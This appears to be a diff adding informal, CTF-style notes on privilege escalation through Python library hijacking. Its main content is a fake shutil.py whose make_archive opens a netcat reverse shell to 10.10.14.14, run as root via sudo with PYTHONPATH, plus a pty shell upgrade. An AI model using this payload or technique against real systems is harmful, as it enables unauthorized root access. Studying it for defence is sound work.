@@ -1,1 +1,67 @@
 
+run the command below to get an ordered list of directories:
+
+python -c 'import sys; print "\n".join(sys.path)'
+
+/usr/lib/python2.7
+/usr/lib/python2.7/plat-x86_64-linux-gnu
+/usr/lib/python2.7/lib-tk
+/usr/lib/python2.7/lib-old
+/usr/lib/python2.7/lib-dynload
+/usr/local/lib/python2.7/dist-packages
+/usr/lib/python2.7/dist-packages
+
+If any of these search paths are world writable, it will impose a risk of privilege escalation, as placing a file 
+in one of these directories with a name that matches the requested library will load that file.
+
+example:-consider task.sh file which is backing up data by calling backup.py
+
+backup_web()
+{
+    if [ "$EUID" -eq 0 ]
+    then
+        echo "Running backup script in the background, it might take a while..."
+        /opt/scripts/backup.py &
+    else
+        echo "Insufficient privileges to perform the selected operation."
+    fi
+}
+now backup.py 
+#!/usr/bin/python3
+
+from shutil import make_archive
+
+src = '/var/www/html/'
+
+# old ftp directory, not used anymore
+#dst = '/srv/ftp/html'
+
+dst = '/var/backups/html'
+
+make_archive(dst, 'gztar', src)
+
+
+now backup.py is importing data from shutil.py from make_archive
+
+so create a neew shutil.py which will contain our escalation code
+
+import os
+
+def make_archive(a,b,c):
+	os.system("nc 10.10.14.14 443 -e '/bin/sh'")
+
+as shutil was importing from make_archive 
+
+now change the path of python to the fake library you have created in which there is 
+shutil.py
+sudo PYTHONPATH=~/fakelib /opt/scripts/admin_tasks.sh 
+in this we have cretaed shutil.py in fakelib
+
+
+voila you get a shell
+run python pty
+python -c "import pty;pty.spawn('/bin/bash')"
+
+to get a shell
+
+
